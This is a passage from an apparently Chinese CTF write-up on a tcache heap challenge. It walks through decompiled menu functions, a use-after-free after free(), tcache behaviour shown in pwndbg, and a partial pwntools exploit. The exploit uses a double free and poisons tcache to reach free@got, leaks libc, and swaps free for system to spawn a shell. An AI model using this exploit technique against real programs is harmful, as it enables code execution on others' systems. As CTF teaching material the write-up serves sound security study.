class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到这是一道常见的菜单题目，一共有四个功能，分别是添加，删除，修改，打印，然后跟进四个函数</p><h2 id="add"><a href="#add" class="headerlink" title="add()"></a>add()</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">add</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  v3 = <span class="hljs-number">-1</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">0xF</span>; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !ptr[i] )<br>    &#123;<br>      v3 = i;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">-1</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Error: Don&#x27;t have enough space!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What size do you want?&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>    ptr[v3] = <span class="hljs-built_in">malloc</span>(v1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Success! The index is %d .\n&quot;</span>, v3);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>从add函数中可以看出，我们可以自己控制chunk的大小，与此同时还限定了最多分配１６个chunk</p><h2 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">delete</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Which one do you want to delete?&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( (v1 &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0</span> &amp;&amp; v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; ptr[v1] )<br>  &#123;<br>    <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span> *)ptr[v1]);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Error: Invalid index!\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里可以看到漏洞点，free指针后没有清零</p><h2 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">edit</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v3 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Which one do you want to modify?&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( (v1 &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0</span> &amp;&amp; v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; ptr[v1] )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What size is the point?&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v2);<br>    <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, (<span class="hljs-type">void</span> *)ptr[v1], v2);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Error: Invalid index!\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>edit函数可以方便我们进行漏洞利用从而进行任意地址malloc</p><h2 id="show"><a href="#show" class="headerlink" title="show"></a>show</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v2; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v2 = __readfsqword(<span class="hljs-number">0x28u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Which one do you want to see?&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( (v1 &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0</span> &amp;&amp; v1 &lt;= <span class="hljs-number">0xF</span> &amp;&amp; ptr[v1] )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)ptr[v1]);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Error: Invalid index!\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28u</span>) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure><p>show函数方便我们进行地址泄露</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>下面的内容就很明了了,但首先我们先抛开如何解这道题，我们先来看看tcache的一些小机制</p><h3 id="tcache机制"><a href="#tcache机制" class="headerlink" title="tcache机制"></a>tcache机制</h3><p>先用gdb加载程序，然后在main函数处下断点</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crystal">nightrain<span class="hljs-variable">@root</span>-pwn-<span class="hljs-symbol">me:</span>~<span class="hljs-regexp">/pwn/tcache</span><span class="hljs-regexp">/tcache$ gdb ./tcache</span><br>pwndbg&gt; b main<br>Breakpoint <span class="hljs-number">1</span> at <span class="hljs-number">0x400b2b</span><br>pwndbg&gt; <br></code></pre></td></tr></table></figure><p>好了，然后让我们把程序跑起来，我们先分配两个大小为３２的堆块然后按照０，１的顺序ｆｒｅｅ掉他们<br>也就是add两次，free两次</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> PREV_INUSE &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>, <br>  mchunk_size = <span class="hljs-number">593</span>, <br>  fd = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>, <br>  fd_nextsize = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603250</span> FASTBIN &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>, <br>  mchunk_size = <span class="hljs-number">49</span>, <br>  fd = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>, <br>  fd_nextsize = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x603280</span> FASTBIN &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>, <br>  mchunk_size = <span class="hljs-number">49</span>, <br>  fd = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>, <br>  fd_nextsize = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br><span class="hljs-number">0x6032b0</span> PREV_INUSE &#123;<br>  mchunk_prev_size = <span class="hljs-number">0</span>, <br>  mchunk_size = <span class="hljs-number">134481</span>, <br>  fd = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>, <br>  fd_nextsize = <span class="hljs-number">0x0</span>, <br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>此时堆块如上，可以看到我们get了两个大小为49的chunk，为什么是49呢，因为是64位，要和１６对齐，而因为我们申请的大小为３２，此时size+8为40，向１６位对齐为４８，再加上１位标志位，就成了４９,地址内容如下：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">32 0x603250</span><br><span class="hljs-number">0x603250</span>:<span class="hljs-number">0x00000000</span><span class="hljs-number">0x00000000</span><span class="hljs-number">0x00000031</span><span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x603260</span>:<span class="hljs-number">0x00000000</span><span class="hljs-number">0x00000000</span><span class="hljs-number">0x00000000</span><span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x603270</span>:<span class="hljs-number">0x00000000</span><span class="hljs-number">0x00000000</span><span class="hljs-number">0x00000000</span><span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x603280</span>:<span class="hljs-number">0x00000000</span><span class="hljs-number">0x00000000</span><span class="hljs-number">0x00000031</span><span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x603290</span>:<span class="hljs-number">0x00603260</span><span class="hljs-number">0x00000000</span><span class="hljs-number">0x00000000</span><span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x6032a0</span>:<span class="hljs-number">0x00000000</span><span class="hljs-number">0x00000000</span><span class="hljs-number">0x00000000</span><span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x6032b0</span>:<span class="hljs-number">0x00000000</span><span class="hljs-number">0x00000000</span><span class="hljs-number">0x00020d51</span><span class="hljs-number">0x00000000</span><br><span class="hljs-number">0x6032c0</span>:<span class="hljs-number">0x00000000</span><span class="hljs-number">0x00000000</span><span class="hljs-number">0x00000000</span><span class="hljs-number">0x00000000</span><br></code></pre></td></tr></table></figure><p>然后我们依次free掉这两个chunk</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">pwndbg&gt; bins</span><br><span class="hljs-attribute">tcachebins</span><br><span class="hljs-attribute">0x30 [  2]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x603290 —▸ 0x603260 ◂— 0x0</span><br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x30</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x40</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x50</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x60</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x70</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x80</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>我们就得到了两个tcache chunk,其中不难看出0x603260为第０个chunk,然后我们再申请一次大小为３２的chunk</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">pwndbg&gt; bins</span><br><span class="hljs-attribute">tcachebins</span><br><span class="hljs-attribute">0x30 [  1]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x603260 ◂— 0x0</span><br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x30</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x40</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x50</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x60</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x70</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x80</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>这里可以看到我们将第1个tcache先拿出去了，这里就是tcache的一个小机制了，tcache是先进后出</p><h3 id="tcache的一些小利用例子"><a href="#tcache的一些小利用例子" class="headerlink" title="tcache的一些小利用例子"></a>tcache的一些小利用例子</h3><p>为了避免造轮子，大家可以直接看<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/">ctf-wiki</a></p><h3 id="本题解法"><a href="#本题解法" class="headerlink" title="本题解法"></a>本题解法</h3><p>上面列举了一小点tcache的机制，下面开始对本题进行求解<br>本题我采用修改free@got为system函数来进行求解，当然，泄露libc基址的办法有很多，我们可以申请unsorted bin来泄露，而因为本题使用了tcache机制，因此我们采用double free的方式进行泄露<br>这里我们先写了菜单：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs scss">def <span class="hljs-built_in">add</span>(size):<br>    p.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;Your choice?&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;What size do you want?&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><br>def <span class="hljs-built_in">edit</span>(num,size,buf):<br>    p.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;Your choice?&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    log.<span class="hljs-built_in">success</span>(<span class="hljs-string">&#x27;[*]choice3&#x27;</span>)<br>    p.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;Which one do you want to modify?&#x27;</span>,<span class="hljs-built_in">str</span>(num))<br>    log.<span class="hljs-built_in">success</span>(<span class="hljs-string">&#x27;[*]str&#x27;</span>)<br>    p.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;What size is the point?&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    log.<span class="hljs-built_in">success</span>(<span class="hljs-string">&#x27;[*]256&#x27;</span>)<br>    p.<span class="hljs-built_in">send</span>(buf)<br><br>def <span class="hljs-built_in">show</span>(num):<br>    p.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;Your choice?&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;Which one do you want to see?&#x27;</span>,<span class="hljs-built_in">str</span>(num))<br><br>def <span class="hljs-built_in">dele</span>(num):<br>    p.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;Your choice?&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.<span class="hljs-built_in">sendlineafter</span>(<span class="hljs-string">&#x27;Which one do you want to delete?&#x27;</span>,<span class="hljs-built_in">str</span>(num))<br></code></pre></td></tr></table></figure><p>然后我们利用double free来进行libc的泄露<br>步骤如下：add(24) -&gt; dele(0) -&gt; dele(0) -&gt; add(24) -&gt; add(24) -&gt; show(2)</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">pwndbg&gt; bins</span><br><span class="hljs-attribute">tcachebins</span><br><span class="hljs-attribute">0x20 [  1]</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x602018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x7fab79c65950 (free) ◂— ...</span><br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x30</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x40</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x50</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x60</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x70</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">0x80</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure><p>在dele后我停了一下，此时tcache的next指针已经指向了free函数，我们只需要再申请两次chunk然后直接进行打印就可以得到free的地址，然后减去free@got的地址就可以直接得到libc的基址<br>此时我们可以提前把id为１的chunk块内容改成&#x2F;bin&#x2F;sh，最后只要把free函数改成system函数，然后dele(1)就可以get shell了，exp如下：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><br>context.word_size = <span class="hljs-number">64</span><br>context.os = <span class="hljs-string">&quot;linux&quot;</span><br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-comment">#context.log_level=&quot;debug&quot;</span><br>p=<span class="hljs-built_in">process</span>(<span class="hljs-string">&#x27;./tcache&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;eonew.cn&#x27;, 60109)</span><br>elf=ELF(<span class="hljs-string">&#x27;./tcache&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><br><span class="hljs-keyword">try</span>:<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;pid&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>    f.<span class="hljs-built_in">write</span>(str(proc.pidof(p)[<span class="hljs-number">0</span>]))<br>    f.<span class="hljs-built_in">close</span>()<br>except Exception <span class="hljs-keyword">as</span> e:<br>    print(e)<br><br>def <span class="hljs-built_in">add</span>(size):<br>    p.sendlineafter(<span class="hljs-string">&#x27;Your choice?&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;What size do you want?&#x27;</span>,str(size))<br><br>def edit(<span class="hljs-built_in">num</span>,size,buf):<br>    p.sendlineafter(<span class="hljs-string">&#x27;Your choice?&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    <span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;[*]choice3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Which one do you want to modify?&#x27;</span>,str(<span class="hljs-built_in">num</span>))<br>    <span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;[*]str&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;What size is the point?&#x27;</span>,str(size))<br>    <span class="hljs-built_in">log</span>.success(<span class="hljs-string">&#x27;[*]256&#x27;</span>)<br>    p.<span class="hljs-built_in">send</span>(buf)<br><br>def show(<span class="hljs-built_in">num</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;Your choice?&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Which one do you want to see?&#x27;</span>,str(<span class="hljs-built_in">num</span>))<br><br>def dele(<span class="hljs-built_in">num</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;Your choice?&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Which one do you want to delete?&#x27;</span>,str(<span class="hljs-built_in">num</span>))<br><br><br><span class="hljs-comment">#pause()</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">24</span>)<br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#pause()</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">24</span>,p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br><span class="hljs-built_in">add</span>(<span class="hljs-number">24</span>)<br><span class="hljs-comment">#pause()</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">24</span>,<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>)<br><span class="hljs-comment">#pause()</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">24</span>)<br>show(<span class="hljs-number">2</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-built_in">result</span>=u64(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:<span class="hljs-number">-1</span>].ljust(<span 